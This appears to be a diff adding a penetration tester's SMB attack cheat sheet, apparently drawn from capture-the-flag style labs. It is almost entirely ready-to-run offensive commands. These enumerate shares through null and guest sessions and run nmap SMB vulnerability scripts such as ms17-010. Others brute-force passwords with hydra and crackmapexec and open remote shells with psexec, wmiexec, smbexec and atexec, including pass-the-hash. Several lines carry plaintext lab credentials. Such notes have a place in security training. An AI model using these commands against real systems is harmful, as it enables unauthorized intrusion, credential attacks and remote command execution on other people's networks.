@@ -1,1 +1,85 @@
+Set the recurse command and prompt off before downloading all files for an easy single line download:
+smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
+smb: \> recurse
+smb: \> prompt off
+smb: \> mget *
+
+
+smbclient -L //<RHOST>/ -N
+smbclient -L ////<RHOST>/ -N
+smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
+smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
+smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
+smbclient --no-pass //<RHOST>/<SHARE>
+smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18 
+smbclient -U ''  -L \\\\192.168.235.55\\ 
+smbclient -U ''  \\\\192.168.235.55\\Shenzi 
+smbclient //172.16.125.21/monitoring -U relia//jim%Castello1! <---Had to use the domain name
+
+
+Nmap scripts:
+$ nmap --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse -p 139,445 192.168.115.40
+$ nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
+
+
+
+
+Checking for shares I can connect to with a null session using smbclient:
+root@kali# smbclient -N -L //10.10.10.130
+
+I could also do this with smbmap, as long as I give it a bad username (see failure the first time, but success on adding -u mute):
+root@kali# smbmap -H 10.10.10.130
+root@kali# smbmap -u mute -H 10.10.10.130
+
+I’ll try anonymous connections to the SMB shares, but no love:
+root@kali# smbmap -H 10.10.10.175
+root@kali# smbclient -N -L //10.10.10.175
+
+Because I’ve been burned enumerating SMB before, I’ll double check with smbclient, and I get a list of shares:
+root@kali# smbclient -N -L \\\\10.10.10.103
+
+with user creds try again
+root@kali# smbmap -H 10.10.10.103 -u amanda -p Ashare1972
+root@kali# smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
+
+
+Manual testing
+smbmap -H <IP>
+smbmap -u '' -p '' -H <IP>
+smbmap -u 'guest' -p '' -H <IP>
+smbmap -u '' -p '' -H <IP> -R
+
+crackmapexec smb <IP>
+crackmapexec smb <IP> -u '' -p ''
+crackmapexec smb <IP> -u 'guest' -p ''
+crackmapexec smb <IP> -u '' -p '' --shares
+
+enum4linux -a <IP>
+
+smbclient --no-pass -L //$IP
+smbclient //<IP>/<SHARE>
+
+Brute force
+crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
+
+Mount a SMB share
+mkdir /tmp/share
+sudo mount -t cifs //<IP>/<SHARE> /tmp/share
+sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
+
+Get a shell
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
+atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
+
+
 
